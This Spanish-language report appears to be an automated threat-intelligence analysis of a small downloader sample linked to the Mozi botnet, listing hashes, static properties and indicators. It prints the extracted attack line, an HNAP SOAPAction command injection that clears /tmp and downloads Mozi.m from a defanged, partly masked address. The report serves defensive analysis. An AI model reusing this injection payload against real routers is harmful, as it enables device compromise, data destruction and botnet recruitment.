# 🧬 Payload Analysis

`23b0fb4d03817e2e938427094c9272014168ec9949401dfaefc8a2780432d19c`

## 📌 Resumen

Texto ASCII de 794 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `XMLSchema-instance` en `hxxp://www[.]w3[.]org/2001/XMLSchema-instance`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `rm -rf *`
2. `wget hxxp://102.33.32.XXX:42376/Mozi.m`
3. `chmod 777 /t` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/23b0fb4d03817e2e938427094c9272014168ec9949401dfaefc8a2780432d19c.md](../../../../../malware-like/oraculo/downloader/23b0fb4d03817e2e938427094c9272014168ec9949401dfaefc8a2780432d19c.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:07.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `23b0fb4d03817e2e938427094c9272014168ec9949401dfaefc8a2780432d19c`
- **SHA1:** `087a72c1f9c57933f4af918591c09a56e60599fa`
- **MD5:** `8d8785868648ac27d0abbc843ecb94e5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (531), with CRLF line terminators |
| Tamaño | 794 B |
| Entropía | 5.41 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (531), with CRLF line terminators; iocs=9

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://102.33.32.XXX:42376/Mozi.m && chmod 777 /t
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
| url | hxxp://102.33.32.XXX:42376/Mozi.m | strings |
| ip | 190.179.177.XXX | static_analysis |
| ip | 102.33.32.XXX | static_analysis |
| command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://102.33.32.XXX:42376/Mozi.m && chmod 777 /t | strings |
| hash | 23b0fb4d03817e2e938427094c9272014168ec9949401dfaefc8a2780432d19c | static_analysis |
| ip | 122.97.214.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
